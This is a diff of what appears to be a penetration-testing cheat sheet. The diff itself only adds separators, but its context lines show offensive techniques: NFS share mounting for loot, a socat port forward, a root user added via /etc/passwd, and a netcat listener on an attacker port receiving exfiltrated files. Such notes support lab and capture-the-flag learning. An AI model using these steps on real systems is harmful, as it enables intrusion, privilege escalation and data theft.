@@ -84,16 +84,19 @@ mkdir tmp/
 sudo mount -t nfs 10.10.104.64: tmp
 tree tmp
 ```
+---
 #### if 2049 port is open (mount)
 ```
 showmount -e $IP
 mount -t nfs $IP:/mnt/backups /mnt/loot
 ```
+---
 #### socat if open port
 ```python
 ./socat tcp-listen:8888,reuseaddr,fork tcp:localhost:22
 ```
 
+---
 #### create new user in /etc/passwd with root
 
 ```
@@ -121,16 +124,19 @@ nc -l ATTACKER_PORT > [output_file_path]
 scp backup.zip toor@192.168.122.30:/home/username_of_remote_host
 scp -i id_rsa user@$IP:/home/willow/user.jpg . 
 ```
+---
 #### fix PATH in old ubuntu
 ```
 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
+---
 #### mount
 ```sh
 sudo apt install nfs-common
 showmount -e $IP
 sudo mkdir /mnt/nfs                                                              sudo mount -t nfs $IP:/var/failsafe /mnt/nfs 
 ```
+---
 
 #### grep
 ```sh
@@ -161,6 +167,7 @@ grep -w 'root'               # only word root, not asdrootas
 ```
 ssh-keygen -t rsa -q -f "$HOME/.ssh/id_rsa" -N ""
 ```
+---
 #### ftp
 ```
 ftp -A $IP #connect anon
@@ -168,6 +175,7 @@ ftp -A $IP #connect anon
 prompt off
 mget * #download all files
 ```
+---
 #### vim
 ```vim
 Shift+H     # Move cursor to the top of the screen.
@@ -186,6 +194,7 @@ g~ ~        # Toggle case of all characters in the current line.
 gf          # Open the file whose name is under the cursor, '^' to go back.
 gv          # Return to the previous selection after visual mode.
 ```
+---
 #### tmux
 ```
 ctrl b d # сохранить сессию и выйти из нее
@@ -197,6 +206,7 @@ cb w     # list windows
 tmux new -s [name_of_new_window]
 cb :set -g mouse on
 ```
+---
 #### magic numbers
 png
 ```
@@ -208,6 +218,7 @@ GIF87a    474946383761
 GIF89a    474946383961
 ```
 
+---
 #### mv multiple files
 ```
 mv -t DESTINATION file1 file2 file3
